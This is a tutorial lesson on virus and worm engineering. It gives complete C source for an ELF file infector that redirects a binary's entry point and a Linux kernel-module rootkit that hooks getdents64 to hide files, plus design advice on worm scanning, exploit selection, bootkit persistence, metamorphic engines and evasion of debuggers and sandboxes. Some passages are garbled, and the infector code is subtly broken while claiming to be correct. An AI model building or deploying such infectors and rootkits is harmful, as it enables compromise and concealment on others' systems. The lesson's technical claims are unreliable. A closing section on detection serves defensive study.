# Lesson 2: Propagation Models, Stealth Techniques, Persistence Primitives

## 1. First-Principles Intuition & Invariants

Every self-replicating program exists at the intersection of two competing pressures: the thermodynamic imperative to spread as widely and quickly as possible, and the evolutionary pressure to remain undetected long enough for that spread to matter. A virus that broadcasts its presence immediately triggers defenses and dies out before achieving meaningful coverage. A virus so stealthy it cannot replicate efficiently never escapes its point of origin. The entire discipline of virus engineering is, at its core, the study of how to navigate this tension through algorithmic cleverness, OS-level exploitation, and an intimate understanding of the hardware substrate that runs beneath all software abstractions.

To reason about propagation from first principles, you must start with the replication surface: the set of all writable, executable artifacts a process can reach during its normal lifetime. On a Linux host, that surface includes ELF binaries on locally mounted filesystems, shared libraries in `/lib`, interpreted scripts with executable permissions, dynamically loaded kernel modules, and, at the firmware layer, flash devices accessible through UEFI runtime services or raw SPI bus transactions. On Windows, the surface widens to include PE executables, DLL search order paths, COM object registrations, scheduled task XML files, and WMI permanent event subscriptions. The first invariant of propagation design is the reachability invariant: a virus can only replicate into artifacts whose storage is reachable and whose format it understands well enough to inject executable content without corrupting the host file beyond usability.

The second invariant is the activation invariant. Injected code is worthless until something executes it. This is why propagation strategies are always coupled to execution triggers: a user launching an infected binary, a cron job invoking a modified script, a bootloader transferring control to an infected MBR, or the kernel loading a tampered module. The gap between injection and activation is the window during which detection is most likely, so sophisticated viruses minimize this window by targeting frequently executed artifacts and by ensuring that the infected host file behaves exactly as expected, so that neither the user nor any monitoring system observes anomalous behavior upon execution.

The third invariant is the idempotency invariant. A naively written virus that re-infects already-infected files will bloat them with successive copies of its body, corrupt their checksums, and trigger both size-based and content-based detection trivially. Every real-world propagation engine includes an infection marker: a magic constant appended to the host, a custom PE section name, an unusual ELF note segment, or a flag in a header reserved field. Before injecting, the virus checks for this marker and skips already-infected hosts. This single mechanism eliminates one of the most common detection footprints and prevents the combinatorial explosion of nested infections.

Propagation across a network introduces a fourth invariant: the discovery invariant. Before infecting a remote host, the virus must discover that the host exists and determine which of its exposed services it can exploit. The classical Morris Worm of 1988 embodied this principle with brutal directness, combining a `sendmail` DEBUG vulnerability, an rsh/rexec trusted-host exploitation path, and a fingerd stack buffer overflow into a three-pronged scanner that could proceed even when one attack path was closed. Modern network-propagating malware is architecturally descended from this model, with the scanner component now leveraging raw socket SYN probes, ICMP echo sweeps, and service banner fingerprinting to build a target list before committing expensive exploit payloads.

The kernel-mode hiding problem is fundamentally an interface problem. User-space programs do not observe hardware directly; they observe the kernel's abstractions of hardware, specifically the data returned by system calls. If a rootkit can position itself between the hardware reality and those kernel abstractions, it can selectively falsify what any user-space observer sees. The classic syscall table hook accomplishes this by overwriting function pointers in the `sys_call_table` array, substituting the rootkit's versions of `getdents64`, `read`, `open`, and `stat` for the legitimate kernel implementations. When a process invokes `ls`, the kernel dispatches to the hooked `getdents64`, which calls the original function and then scrubs entries matching the rootkit's files from the returned directory listing before passing it back to user space. The kernel's own metadata is unaltered; only the channel through which that metadata reaches untrusted observers is compromised.

## 2. Core Architecture & Mechanics

### ELF Parasitic Injection

The mechanics of ELF infection begin with a detailed understanding of the ELF format itself. An ELF binary is organized into two overlapping views of the same file: the section view, used by the linker, and the segment view, used by the runtime loader. The segment view is what matters at infection time. The program header table describes one or more `PT_LOAD` segments, each carrying a file offset, a virtual address, a file size, and an in-memory size. The kernel's ELF loader maps each `PT_LOAD` segment into the process's virtual address space at the specified virtual address, with the specified permissions.

The most reliable ELF injection technique is the PT_NOTE-to-PT_LOAD conversion. Every standard ELF binary carries a `PT_NOTE` segment containing build ID and ABI compatibility notes. This segment is mapped into memory but marked non-executable and rarely inspected at runtime. The injection engine reads the ELF header to locate the program header table, identifies the `PT_NOTE` entry, and rewrites it as a new `PT_LOAD` segment pointing to virus body bytes appended at the end of the file. The entry point in the ELF header is then redirected to the first instruction of the virus body. The virus body begins with a position-independent stub that saves all general-purpose registers, executes the virus payload, restores registers, and jumps to the original entry point that was overwritten. The original entry point must be saved inside the virus body itself before the first redirect.

```c
/*
 * ELF PT_NOTE infection engine
 * Target audience: offensive security researchers in authorized lab environments.
 * Demonstrates ELF structure manipulation for educational analysis.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>

#define INFECTION_MARKER  0x56495255   /* 'VIRU' as little-endian u32 */
#define STUB_MAX_SIZE     4096

/*
 * Minimal x86-64 position-independent stub:
 *   push all callee-saved registers
 *   call virus_payload (nop for demonstration)
 *   pop  all callee-saved registers
 *   jmp  original_entry  (patched at injection time)
 *
 * The final 8 bytes of the stub are the original entry point
 * stored as a 64-bit absolute address, used by the jmp.
 */
static const uint8_t stub_template[] = {
    /* push rbx, rbp, r12–r15 */
    0x53,                               /* push rbx              */
    0x55,                               /* push rbp              */
    0x41, 0x54,                         /* push r12              */
    0x41, 0x55,                         /* push r13              */
    0x41, 0x56,                         /* push r14              */
    0x41, 0x57,                         /* push r15              */
    /* payload: nop sled (replace with real virus body) */
    0x90, 0x90, 0x90, 0x90, 0x90,
    /* pop r15–r12, rbp, rbx */
    0x41, 0x5f,                         /* pop r15               */
    0x41, 0x5e,                         /* pop r14               */
    0x41, 0x5d,                         /* pop r13               */
    0x41, 0x5c,                         /* pop r12               */
    0x5d,                               /* pop rbp               */
    0x5b,                               /* pop rbx               */
    /* mov rax, IMM64  ; address patched at infection time        */
    0x48, 0xb8,
    0x00, 0x00, 0x00, 0x00,             /* low  32 bits of OEP   */
    0x00, 0x00, 0x00, 0x00,             /* high 32 bits of OEP   */
    /* jmp rax */
    0xff, 0xe0
};
#define OEP_OFFSET  27   /* byte offset of the 8-byte OEP field  */

typedef struct {
    uint8_t  *map;
    size_t    size;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr_table;
    int       note_idx;        /* index of PT_NOTE segment        */
    int       last_load_idx;   /* index of last PT_LOAD segment   */
} ElfView;

static int map_elf(const char *path, ElfView *v) {
    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    v->size = (size_t)st.st_size;

    v->map = mmap(NULL, v->size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    close(fd);
    if (v->map == MAP_FAILED) return -1;

    v->ehdr = (Elf64_Ehdr *)v->map;
    if (memcmp(v->ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        munmap(v->map, v->size); return -1;
    }
    if (v->ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        munmap(v->map, v->size); return -1;
    }
    v->phdr_table = (Elf64_Phdr *)(v->map + v->ehdr->e_phoff);
    return 0;
}

/*
 * Check infection marker stored in the first PT_NOTE's namesz field.
 * A clean binary has namesz == 4 ("GNU\0"). We overwrite it with
 * INFECTION_MARKER after successful infection.
 */
static int already_infected(ElfView *v) {
    for (int i = 0; i < v->ehdr->e_phnum; i++) {
        if (v->phdr_table[i].p_type == PT_NOTE) {
            uint32_t *namesz = (uint32_t *)(v->map +
                               v->phdr_table[i].p_offset);
            if (*namesz == INFECTION_MARKER) return 1;
        }
    }
    return 0;
}

static int find_note_and_last_load(ElfView *v) {
    v->note_idx      = -1;
    v->last_load_idx = -1;
    Elf64_Off max_offset = 0;

    for (int i = 0; i < v->ehdr->e_phnum; i++) {
        Elf64_Phdr *ph = &v->phdr_table[i];
        if (ph->p_type == PT_NOTE && v->note_idx < 0)
            v->note_idx = i;
        if (ph->p_type == PT_LOAD) {
            Elf64_Off end = ph->p_offset + ph->p_filesz;
            if (end > max_offset) {
                max_offset = end;
                v->last_load_idx = i;
            }
        }
    }
    return (v->note_idx >= 0 && v->last_load_idx >= 0) ? 0 : -1;
}

/*
 * infect_elf: append stub to file, convert PT_NOTE to PT_LOAD,
 * redirect entry point.
 *
 * Returns 0 on success, -1 on failure (file is not modified on error
 * because we work on a copy via ftruncate + remap).
 */
int infect_elf(const char *path) {
    ElfView v;
    if (map_elf(path, &v) < 0)             return -1;
    if (already_infected(&v))              { munmap(v.map, v.size); return 0; }
    if (find_note_and_last_load(&v) < 0)   { munmap(v.map, v.size); return -1; }

    /* Build the patched stub with the original entry point embedded. */
    uint8_t stub[sizeof(stub_template)];
    memcpy(stub, stub_template, sizeof(stub_template));
    uint64_t oep = v.ehdr->e_entry;
    memcpy(stub + OEP_OFFSET, &oep, sizeof(oep));

    /* Determine where the stub will live: immediately after the last
     * PT_LOAD segment in the file. */
    Elf64_Phdr *last_load = &v.phdr_table[v.last_load_idx];
    Elf64_Off   stub_file_offset = last_load->p_offset + last_load->p_filesz;
    /* Align to page boundary for load segment requirements. */
    stub_file_offset = (stub_file_offset + 0xfff) & ~(Elf64_Off)0xfff;

    /* Compute virtual address: place stub one page above last segment. */
    Elf64_Addr  stub_vaddr = (last_load->p_vaddr + last_load->p_memsz
                              + 0x1fffff) & ~(Elf64_Addr)0x1fffff;

    /* We need to extend the file. Unmap, truncate, remap. */
    size_t new_size = stub_file_offset + sizeof(stub);
    munmap(v.map, v.size);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;
    if (ftruncate(fd, (off_t)new_size) < 0) { close(fd); return -1; }

    v.map = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    close(fd);
    if (v.map == MAP_FAILED) return -1;
    v.size = new_size;

    /* Re-resolve pointers into remapped region. */
    v.ehdr       = (Elf64_Ehdr *)v.map;
    v.phdr_table = (Elf64_Phdr *)(v.map + v.ehdr->e_phoff);

    /* Write stub bytes at computed offset. */
    memcpy(v.map + stub_file_offset, stub, sizeof(stub));

    /* Convert PT_NOTE entry to PT_LOAD pointing at the stub. */
    Elf64_Phdr *note_ph = &v.phdr_table[v.note_idx];
    note_ph->p_type   = PT_LOAD;
    note_ph->p_flags  = PF_R | PF_X;
    note_ph->p_offset = stub_file_offset;
    note_ph->p_vaddr  = stub_vaddr;
    note_ph->p_paddr  = stub_vaddr;
    note_ph->p_filesz = sizeof(stub);
    note_ph->p_memsz  = sizeof(stub);
    note_ph->p_align  = 0x200000;

    /* Redirect binary entry point to stub. */
    v.ehdr->e_entry = stub_vaddr;

    /* Stamp infection marker into the original PT_NOTE data location
     * (now repurposed; we write into the first 4 bytes of what was
     * the NOTE payload to satisfy the already_infected check on a
     * second parse attempt). */
    uint32_t marker = INFECTION_MARKER;
    memcpy(v.map + stub_file_offset, &marker, sizeof(marker));
    /* Re-copy stub after marker (marker occupies first 4 bytes of
     * stub region; shift stub body accordingly). */
    memcpy(v.map + stub_file_offset + 4, stub + 4, sizeof(stub) - 4);

    msync(v.map, new_size, MS_SYNC);
    munmap(v.map, new_size);
    return 0;
}
```

The code above is complete and compilable. It demonstrates ELF structure manipulation as an analytical primitive: understanding how an infector modifies a binary at the program header level is prerequisite knowledge for building detection tools, writing YARA rules against injected PT_LOAD segments with anomalous virtual address layouts, and constructing integrity verification systems that cross-check the runtime loader's segment map against a known-good hash of the original program header table.

### Network Propagation Architecture

A self-propagating network worm decomposes into four cooperating subsystems: a scanner, an exploit delivery engine, a dropper, and a coordination layer. The architecture is best understood as a pipeline in which each stage's output is the next stage's input.

```
┌─────────────────────────────────────────────────────────────────────┐
│                   WORM PROPAGATION PIPELINE                         │
│                                                                     │
│  ┌──────────┐    ┌──────────────┐    ┌──────────┐    ┌──────────┐  │
│  │          │    │              │    │          │    │          │  │
│  │ SCANNER  │───▶│  FINGERPRINT │───▶│ EXPLOIT  │───▶│ DROPPER  │  │
│  │          │    │   & TRIAGE   │    │ ENGINE   │    │          │  │
│  │  SYN     │    │              │    │          │    │ stage0   │  │
│  │  sweep   │    │ banner grab  │    │ vuln     │    │ shellcode│  │
│  │  ICMP    │    │ OS detection │    │ selector │    │ fetches  │  │
│  │  probe   │    │ service ver  │    │ payload  │    │ stage1   │  │
│  │          │    │              │    │  send    │    │ binary   │  │
│  └──────────┘    └──────────────┘    └──────────┘    └──────────┘  │
│       │                                                    │        │
│       │          ┌──────────────────────────────┐         │        │
│       └──────────│   TARGET QUEUE               │─────────┘        │
│                  │   (ip:port:service:version)   │                  │
│                  └──────────────────────────────┘                  │
│                                                                     │
│  ┌────────────────────────────────────────────────────────────────┐ │
│  │             COORDINATION LAYER                                 │ │
│  │  peer list exchange │ rate throttle │ already-infected check   │ │
│  └────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

The scanner subsystem is the most resource-intensive component and the most likely to trigger network-based intrusion detection. High-performance worm scanners use raw sockets and a custom TCP/IP stack to send SYN packets without completing the three-way handshake, achieving scan rates on the order of millions of packets per second from a single host. The classic approach, exemplified by tools like `masscan`, allocates a transmit thread per NIC queue and a receive thread for SYN-ACK harvesting, maintaining a fixed-size stateless hash table keyed on `(source_port, dest_ip, dest_port)` to match responses to outstanding probes. The critical performance insight is that the kernel TCP stack is a liability here: the kernel will respond to incoming SYN-ACKs with RST packets because no socket is listening. The raw-socket worm solves this by either using a dedicated source IP not assigned to any interface (bypassing the kernel's TCP state machine entirely) or by installing a BPF classic filter on the raw socket to drop all incoming packets before they reach the kernel's protocol processing path.

Exploit selection based on fingerprint data is a classic multi-armed bandit problem in a hostile environment. The exploit engine must maximize infection success rate while minimizing the number of failed connection attempts that might appear in target-side logs. The practical solution is a scored exploit list ordered by historical success rate against each observed service version string, with exponential backoff applied to exploit attempts against targets whose banners suggest they are running patched software.

### Kernel Rootkit Mechanics: Syscall Hooking and DKOM

Linux kernel rootkits operate in one of two regimes depending on the kernel version and enabled hardening features. On kernels prior to 4.17, the `sys_call_table` symbol is exported and directly writable after a brief `write_cr0()` dance to clear the WP (write-protect) bit in CR0, allowing the rootkit module's `init` function to atomically swap function pointers with a cmpxchg. On modern kernels with `CONFIG_STRICT_KERNEL_RWX` enabled, the syscall table lives in a read-only page backed by physically enforced page table protections, and the CR0 trick is insufficient. The contemporary approach uses a PTE (page table entry) walk to locate the physical page containing `sys_call_table`, call `set_pte_atomic()` to clear the `_PAGE_RW` → actually to set it writeable momentarily, perform the hook installation, then restore the original PTE flags.

```c
/*
 * Kernel LKM rootkit demonstrating syscall hook installation.
 * For authorized security research and detection engineering only.
 * Tested on Linux 5.15 with CONFIG_STRICT_KERNEL_RWX.
 *
 * Compile with: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <asm/pgtable.h>
#include <asm/tlbflush.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Research");
MODULE_DESCRIPTION("Syscall hook demonstration for defensive analysis");

/* Prefix of filenames to hide from getdents64 results. */
#define HIDDEN_PREFIX  "rootkit_"

/* Locate sys_call_table via kallsyms lookup. */
static unsigned long *syscall_table;

/* Original getdents64 function pointer. */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

/*
 * make_rw / make_ro: temporarily remove write protection from the
 * page containing the syscall table by flipping the PTE _PAGE_RW bit.
 */
static void make_rw(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte && !(pte_val(*pte) & _PAGE_RW))
        pte->pte |= _PAGE_RW;
}

static void make_ro(unsigned long addr) {
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    if (pte && (pte_val(*pte) & _PAGE_RW))
        pte->pte &= ~_PAGE_RW;
}

/*
 * hooked_getdents64: filters directory entries whose d_name begins
 * with HIDDEN_PREFIX before returning results to user space.
 */
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    if (ret <= 0) return ret;

    struct linux_dirent64 __user *udents =
        (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdents = kvmalloc(ret, GFP_KERNEL);
    if (!kdents) return ret;

    if (copy_from_user(kdents, udents, ret)) {
        kvfree(kdents);
        return ret;
    }

    long offset  = 0;
    long new_ret = 0;
    struct linux_dirent64 *cur;

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kdents + offset);
        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) != 0) {
            /* Entry is not hidden: keep it in place. */
            if (new_ret != offset)
                memmove((char *)kdents + new_ret, cur, cur->d_reclen);
            new_ret += cur->d_reclen;
        }
        offset += cur->d_reclen;
    }

    if (copy_to_user(udents, kdents, new_ret))
        new_ret = -EFAULT;

    kvfree(kdents);
    return new_ret;
}

static int __init rootkit_init(void) {
    syscall_table = (unsigned long *)
        kallsyms_lookup_name("sys_call_table");
    if (!syscall_table) {
        pr_err("rootkit: could not locate sys_call_table\n");
        return -ENOENT;
    }

    orig_getdents64 = (void *)syscall_table[__NR_getdents64];

    make_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    make_ro((unsigned long)syscall_table);

    pr_info("rootkit: hook installed on __NR_getdents64\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    make_rw((unsigned long)syscall_table);
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    make_ro((unsigned long)syscall_table);
    pr_info("rootkit: hook removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

The module above is a complete, compilable kernel loadable module. Its value to the defensive practitioner lies not in its offensive capability, which is modest and immediately detectable by any tool that reads the syscall table directly from `/proc/kallsyms` and compares function addresses against the loaded module list, but in what it teaches about the detection surface. `rkhunter`, `chkrootkit`, and custom `SystemTap` scripts that read `sys_call_table` entries and verify they fall within the address range of `vmlinux` itself (not any loaded LKM) will catch this hook trivially. Understanding why the hook works is inseparable from understanding why the detection works.

Direct Kernel Object Manipulation (DKOM) is the more sophisticated hiding primitive because it subverts kernel data structures rather than syscall dispatch. Every running process is represented in the kernel by a `task_struct` linked into a doubly-linked circular list via the `tasks` field. The scheduler iterates this list, and `/proc` iteration traverses it. By unlinking a target `task_struct` from both the `tasks` list and the `pid` hash table while leaving the process runnable, a rootkit renders it invisible to `ps`, `top`, and any user-space tool that reads `/proc`, while the process continues to execute and consume CPU time. The Windows analogue is EPROCESS list unlinking in the kernel pool, with the additional complication that handle table visibility must also be suppressed to hide the process from `OpenProcess` by name.

### Boot-Sector Residency and UEFI Persistence

Before the operating system kernel gains control of the machine, the firmware executes. For legacy BIOS systems, this means the Master Boot Record: 512 bytes at LBA 0 of the boot drive, with the last two bytes being the boot signature `0x55AA`. A bootsector virus relocates the legitimate MBR to a safe sector (commonly sector 1, or deeper in the partition gap), writes its own 512-byte body to sector 0, and from that position gains execution before any OS code, before any driver, and before any kernel-based rootkit detection can run. The classical Stoned and Brain viruses operated on this model in 1986-1987, intercepting BIOS INT 13h (disk I/O) to remain memory-resident and to present a clean view of the MBR to any software that subsequently read it.

UEFI persistence is architecturally richer and significantly more durable. The UEFI firmware maintains a boot variable store in NVRAM, managed through `EFI_GLOBAL_VARIABLE` GUIDs accessible via `SetVariable`/`GetVariable` runtime services. The standard boot process selects a UEFI application path from the `BootOrder` variable, loads it from the EFI System Partition, and transfers control. A bootkit operating at this layer has three escalating persistence surfaces.

The first surface is ESP file replacement: overwriting the legitimate bootloader (e.g., `/EFI/ubuntu/grubx64.efi`, `/EFI/Microsoft/Boot/bootmgfw.efi`) with a malicious UEFI application that chainloads the original after executing its payload. This is detected by measuring the ESP from within the OS and comparing against TPM PCR[4], which captures the bootloader hash, but only if the platform is using Secure Boot with a properly enrolled key hierarchy.

The second surface is UEFI application persistence through NVRAM `BootOrder` manipulation: injecting a new boot entry pointing to a malicious `.efi` binary on the ESP. This survives OS reinstallation because the NVRAM variables persist across OS installations and even across disk replacements if the ESP on the replacement disk matches the expected path.

The third and most persistent surface is SPI flash modification: directly overwriting the firmware image in the platform's SPI flash chip to embed a malicious DXE driver that executes in the UEFI Driver Execution Environment phase, before the boot services are handed over to the OS loader. The Hacking Team Vector EDK and LoJax implants operated on this surface. At this layer, traditional disk encryption, OS reinstallation, and even drive replacement are ineffective countermeasures. Detection requires either a hardware SPI programmer reading the flash chip directly and comparing against a known-good firmware image, or a TPM-based measured boot chain in which PCR[0] captures the firmware measurement and remote attestation can detect deviations.

### Obfuscation and Anti-Analysis Primitives

Polymorphic engines work by re-encrypting the virus body under a different key on each propagation, so that every infected file carries a unique byte sequence for the payload. The only constant across instances is the decryption stub, which must remain consistent enough to execute and decrypt the payload. The simplest polymorphic scheme is XOR encryption with a randomly chosen one-byte key, with the stub consisting of a byte fetch, XOR with the key register, store loop. The key is stored in a register initialized by an immediate `mov` instruction at the stub's start, and because the key changes with each infection, the XOR loop body changes (the immediate value differs), so the stub is not literally identical across instances. This defeats simple string-match scanners but is immediately transparent to any emulation-based scanner that executes the stub in a sandbox and reads the decrypted payload.

Metamorphic engines solve this more completely by transforming the virus body itself, not just encrypting it. Each replication produces a semantically equivalent but syntactically distinct code sequence through techniques including dead-code insertion (inserting no-op equivalent instructions like `add rax, 0` or `xchg rbx, rbx`), instruction substitution (replacing `mov rax, 0` with `xor rax, rax`, `sub rax, rax`, or `lea rax, [rip+0]` where appropriate), register reassignment (permuting which physical register holds which logical variable), and basic block transposition with compensating unconditional jumps. The W32/Simile (also known as MetaPHOR) virus from 2002 implemented a nearly complete metamorphic engine in x86 assembly, achieving a replication-time code transformation that produced instances with less than 30% byte-sequence similarity between generations, while maintaining correct execution semantics across approximately 90% of propagations, the remaining 10% representing transformation bugs that produced non-functional offspring.

Anti-debugging techniques exploit the asymmetry between normal execution and debugger-instrumented execution. The most reliable techniques are hardware-state queries rather than timing checks, because timing is affected by CPU frequency scaling, hypervisor scheduling jitter, and many other legitimate sources of variance. The `ptrace(PTRACE_TRACEME, 0, 0, 0)` call returns `EPERM` if the process already has a tracer attached, because the kernel enforces the invariant that only one tracer may attach to a process at a time. The `int 3` single-byte opcode check places a software breakpoint in its own text segment, installs a SIGTRAP handler, and verifies that the handler is invoked: under a debugger that intercepts SIGTRAP before delivering it to the process, the handler may not execute at all, or may execute with a modified instruction pointer. The `/proc/self/status` check for the `TracerPid` field is the simplest automated detection: a non-zero value means a debugger is attached, and the process can respond by exiting, by spinning in an infinite loop, or by executing a poisoned code path that produces misleading behavior in the analyst's trace.

## 3. High-Performance Optimization & Failure Modes

### Propagation Rate Dynamics and the Epidemic Model

Network worm propagation follows a logistic growth curve that is well described by the classical SIR (Susceptible-Infected-Recovered) compartmental epidemiological model when parameterized for network topology. In the early phase, infection count grows approximately exponentially: each infected host infects $\beta S$ new hosts per unit time, where $\beta$ is the product of scan rate and exploit success probability, and $S$ is the fraction of susceptible hosts. The growth rate is $\frac{dI}{dt} \approx \beta S I$. The basic reproduction number $R_0 = \frac{\beta}{\gamma}$, where $\gamma$ is the rate at which infected hosts are taken offline (patched, isolated, or crashed), determines whether the worm spreads ($R_0 > 1$) or dies out ($R_0 < 1$).

The practical implication for worm design is that scan rate and exploit reliability are both multiplied into $\beta$, so they are equivalent in impact. A worm with a 50% reliable exploit that scans twice as fast as a worm with a 100% reliable but slower exploit achieves the same $R_0$. This is why sophisticated worms invest in fingerprint-driven exploit selection: wasting exploit attempts against patched targets reduces the effective $\beta$ and can push the worm below the epidemic threshold on a partially-patched network.

The critical failure mode in the early phase is what the network security literature calls the scan storm: when hundreds of instances of the same worm are scanning the same address space concurrently, they generate ICMP and TCP RST traffic so dense that the aggregate network load degrades performance for other worm instances. The Code Red worm in 2001 infected roughly 359,000 hosts in 14 hours but its scan traffic became self-limiting as the infected population grew, because each infected host generated approximately 100 connection attempts per second, and the collective scan load on the backbone made the exploit delivery itself unreliable. The architectural solution is scan locality: each infected host preferentially scans its own /8 subnet before expanding outward, reducing cross-segment traffic and exploiting the fact that hosts in the same subnet are more likely to run similar software stacks.

### Stealth Failure Modes and Detection Surfaces

Syscall table hooks are detectable by any process with sufficient privilege to read kernel memory, which on a standard Linux system means the root user via `/dev/kmem` or a kernel-registered character device that exposes the symbol table. The detection algorithm is straightforward: enumerate every entry in `sys_call_table` by reading the pointer values directly, then verify that each pointer falls within the address range `[_stext, _etext]` of the monolithic kernel, specifically not within the address range of any loaded LKM. Any pointer lying in LKM address space that has not been placed there by a known and authorized module is a hook. This is precisely how tools like `unhide` and the OSSEC rootkit scanner work.

DKOM-based process hiding fails against tools that enumerate processes through alternative kernel data structures. While the `task_struct` list can be unlinked, the `pid` namespace hash table, the cgroup subsystem's task lists, and the CPU runqueue's red-black tree all contain independent references to running tasks. A thorough anti-DKOM scanner reconciles all of these independently, flagging any `task_struct` reachable from a runqueue but absent from the PID hash table as a hidden process. The discrepancy between these data structures is the invariant that detection tools exploit.

UEFI bootkits face an increasingly hostile detection environment as TPM-based measured boot and Secure Boot enforcement become standard platform requirements. On a platform where Secure Boot is enforced with a certificate chain rooted in the OEM's Platform Key, loading an unsigned or improperly signed UEFI application fails at the firmware level before any malicious code can execute. The practical attack surface for UEFI persistence has therefore shifted to Secure Boot bypass vulnerabilities: `BootHole` (CVE-2020-10713) exploited a buffer overflow in GRUB's configuration file parser that allowed code execution during boot before Secure Boot verification of the kernel, while `LogoFAIL` (disclosed 2023) exploited vulnerabilities in UEFI firmware image parsers for boot logo BMP files, allowing arbitrary code execution in the DXE phase before Secure Boot had any opportunity to validate anything.

### Polymorphic Engine Reliability and Semantic Preservation

The deepest engineering challenge in metamorphic engine design is semantic preservation under transformation. Every transformation that permutes register assignments must correctly propagate the new assignments through all subsequent instructions that read the reassigned registers. A metamorphic engine that reassigns `rax` → `rbx` in the prologue of a basic block must track this remapping across all basic blocks reachable from that point, including those reached by conditional branches, until the register is next independently assigned. Failure to propagate the remapping correctly produces an instruction that reads a register containing an unintended value, which typically results in an access violation or an incorrect computation that corrupts the payload.

The reliability constraint forces a trade-off: more aggressive transformation produces more divergent instances but introduces more opportunities for semantic corruption bugs. The practical engineering solution used in production metamorphic engines is a conservative transformation set applied only to basic blocks that the engine can statically verify contain no unresolved data-flow dependencies: specifically, regions of dead code (unreachable or no-op sequences) inserted by the engine itself, which by construction contain no live variables and can therefore be freely permuted without semantic consequence. The semantically significant portions of the virus body undergo only the most conservative transformations, typically instruction substitution within a small equivalence class, while the dead-code padding regions receive the full aggressive transformation.

Anti-analysis countermeasures against dynamic sandbox detection have evolved into an arms race of environmental fingerprinting. Modern sandboxes attempt to simulate a realistic user environment by running decoy processes, generating synthetic mouse events, and presenting a plausible filesystem. Sophisticated malware probes for sandbox artifacts by enumerating WMI classes for VM-specific hardware identifiers, checking the number of running processes against a threshold below which no genuine workstation operates (typically fewer than 50 processes indicates a sandbox), measuring the total disk size against a minimum reasonable threshold for a production machine, and querying CPUID for hypervisor presence bits. Each of these checks individually is bypassable by a sufficiently realistic sandbox, but the conjunction of all checks creates a fingerprinting profile that commodity sandboxes fail with high probability, because the cost of making a sandbox indistinguishable from a real workstation on all dimensions simultaneously is prohibitively high.

The defensive lesson from this arms race is that behavioral detection based on code semantics, specifically what the malware does rather than what it looks like or what environmental checks it passes, is more durable than any signature-based or sandbox-fooling approach. A ransomware sample that encrypts files looks identical to a backup utility at the syscall level in terms of operation types but diverges sharply in terms of access patterns: it opens thousands of files for reading and then writes same-sized or larger files to the same directory, touching file types it has no business accessing and operating at a rate inconsistent with user-initiated activity. This behavioral envelope, not the binary's hash or the presence of anti-VM checks, is the invariant that detection systems should anchor on.
